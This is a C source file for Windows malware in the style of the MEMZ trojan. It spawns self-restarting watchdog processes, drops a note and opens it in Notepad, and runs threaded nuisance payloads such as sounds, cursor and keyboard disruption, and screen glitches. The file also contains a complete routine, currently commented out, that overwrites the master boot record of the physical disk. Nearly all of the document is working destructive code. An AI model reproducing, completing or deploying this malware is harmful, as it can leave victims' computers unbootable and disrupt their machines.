#include <payload.h>
#include <payload_function.h>
#include <overwatch.h>
#include <data.h>

#include <Windows.h>
#include <stdio.h>
#include <string.h>


void notepad_alert()
{
    HANDLE handle_note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (handle_note == INVALID_HANDLE_VALUE)
        ExitProcess(4);

    DWORD wb;
    if (!WriteFile(handle_note, note, note_size, &wb, NULL))
        ExitProcess(5);

    CloseHandle(handle_note);
    ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
}

void overwrite_boot() // DANGER
{
    /*
    HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    if (drive == INVALID_HANDLE_VALUE)
        ExitProcess(2);

    unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

    // Join the two code parts together
    int i = 0;
    for (; i < code1_size; i++)
        *(bootcode + i) = *(code1 + i);
    for (i = 0; i < code2_size; i++)
        *(bootcode + i + 0x1fe) = *(code2 + i);

    DWORD wb;
    if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
        ExitProcess(3);

    CloseHandle(drive);
    */
}

void start_overwatch()
{
    LPSTR fn = (LPSTR)LocalAlloc(LMEM_ZEROINIT, 8192*2);
    GetModuleFileName(NULL, fn, 8192);

    for (int i = 0; i < 2; i++)
        ShellExecute(NULL, NULL, fn, "-overwatch", NULL, SW_SHOWDEFAULT);

    SHELLEXECUTEINFO info;
    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.lpFile = fn;
    info.lpParameters = "-payload";
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = NULL;
    info.lpVerb = NULL;
    info.lpDirectory = NULL;
    info.hInstApp = NULL;
    info.nShow = SW_SHOWDEFAULT;

    ShellExecuteEx(&info);
    SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);
    ExitProcess(0);
}

void overwatch()
{
    printf("From overwatch\n");
    CreateThread(NULL, 0, overwatch_thread, NULL, 0, 0);

    WNDCLASSEXA c;
    c.cbSize = sizeof(WNDCLASSEXA);
    c.lpfnWndProc = window_proc;
    c.lpszClassName = "hax";
    c.style = 0;
    c.cbClsExtra = 0;
    c.cbWndExtra = 0;
    c.hInstance = NULL;
    c.hIcon = 0;
    c.hCursor = 0;
    c.hbrBackground = 0;
    c.lpszMenuName = NULL;
    c.hIconSm = 0;

    RegisterClassExA(&c);

    CreateWindowExA(0, "hax", NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

int main(int argc, char* argv[])
{
    if (argc == 1)
        start_overwatch();

    else if (!strcmp(argv[1], "-overwatch"))
        overwatch();

    else if (!strcmp(argv[1], "-payload"))
    {
        /*//overwrite_boot(); // DANGER*/
        notepad_alert();
        payload_t payloads[] =
        {
            //{ shell_execute, 0, 0, 5000, 0, 0 },
            //{ keyboard_malfunction, 0, 0, 10000, 1000, 200 },
            //{ cursor_malfunction, 5, 0, 100, 0, 0 },
            //{ invert_colors, 0, 0, 1000, 1000, 100 },
            //{ invert_text, 5, 2, 5000, 0, 0 },
            { play_sound, 0, 0, 5000, 100, 100 },
            //{ message_boxes, 1, 0, 20000, 500, 200 },
            //{ draw_icons, 1, 0, 1000, 50, 10 },
            //{ tunnel_vision, 120, 0, 5000, 100, 100 },
            //{ screen_glitches, 60, 0, 20000, 100, 50 },
            //{ buzzer, 180, 0, 0, 0, 0  }
        };

        const size_t payloads_size = sizeof(payloads) / sizeof(payload_t);
        for (size_t i = 0; i < payloads_size; ++i)
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_host, &payloads[i], 0, 0);

        for (;;)
            Sleep(10000);
    }

    /*
    payload_t payloads[] =
        {
            //{ shell_execute, 0, 0, 5000, 0, 0 },
            //{ keyboard_malfunction, 0, 0, 10000, 1000, 200 },
            //{ cursor_malfunction, 5, 0, 100, 0, 0 },
            //{ invert_colors, 0, 0, 1000, 1000, 100 },
            //{ invert_text, 5, 2, 5000, 0, 0 },
            //{ play_sound, 0, 0, 5000, 100, 100 },
            //{ message_boxes, 1, 0, 20000, 500, 200 },
            //{ draw_icons, 1, 0, 1000, 50, 10 },
            //{ tunnel_vision, 120, 0, 5000, 100, 100 },
            //{ screen_glitches, 60, 0, 20000, 100, 50 },
            //{ buzzer, 180, 0, 0, 0, 0  }
        };

    const size_t payloads_size = sizeof(payloads) / sizeof(payload_t);
    for (size_t i = 0; i < payloads_size; ++i)
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_host, &payloads[i], 0, 0);

    for (;;)
        Sleep(10000);
    */

    return 0;
}